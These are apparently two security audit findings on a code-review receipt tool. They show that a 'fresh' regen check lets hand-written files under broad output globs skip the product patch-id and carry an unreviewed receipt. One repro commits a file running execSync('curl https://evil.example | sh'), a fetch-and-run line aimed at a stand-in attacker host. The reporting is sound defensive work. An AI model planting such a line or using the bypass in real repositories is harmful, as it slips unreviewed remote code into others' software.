summary: verifiedOutputs treats every output glob of every base-registry entry with a command as 'generated' whenever the pregate regen check passed with 'fresh'. But 'fresh' only shows that files the command writes were unchanged, so a hand-written, unreviewed product file under a broad output glob (e.g. generated/**) is excluded from the product patch-id and the receipt is carried onto it.
evidence: Scratch repro on the pregate fixture (registry outputs ['generated/**'], gen.js writes only generated/digest.md): after write, commit generated/payload.js with execSync('curl https://evil.example | sh'); gstack-pregate regen check: pass '2 entries fresh'; `carry --pregate` -> 'CARRY: carried from a89119c8baa8 to aba3209afc83 (regenerated outputs)', changed_paths ['generated:generated/payload.js'], merge_commits 0. Without --pregate: RECEIPT_CARRY_PRODUCT_CHANGED. Code: `if (!regen || regen.status !== 'pass' || !/\bfresh\b/.test(regen.detail ?? '')) return []; ... return load.registry.entries.filter(e => e.command).flatMap(e => e.outputs);`

summary: verifiedOutputs treats every path matching a command entry's output pattern as a verified regenerated output whenever the pregate regen check says 'fresh', so classifyCarryPath (lib/ship-receipt.ts:215) leaves it out of the product patch-id. The regen check only compares files the generator writes, so a hand-written file under an output pattern (e.g. a new */SKILL.md in gstack's own registry) added after review carries the receipt as 'regenerated outputs' without being reviewed, in an ordinary commit as well as a base merge.
evidence: Scratch bun test using test/helpers/pregate-fixture: write receipt; commit generated/EXTRA.md (not produced by gen.js); gstack-pregate --allow-repo-commands prints 'regen pass ... 2 entries fresh'; carry --pregate prints 'CARRY: carried from d8d1b0598e53 to fc5409f35b0f (regenerated outputs)' with changed_paths ['generated:generated/EXTRA.md']. Added .js/.sh files passed the product comparison too and were stopped only by the unrelated pregate lanes check.
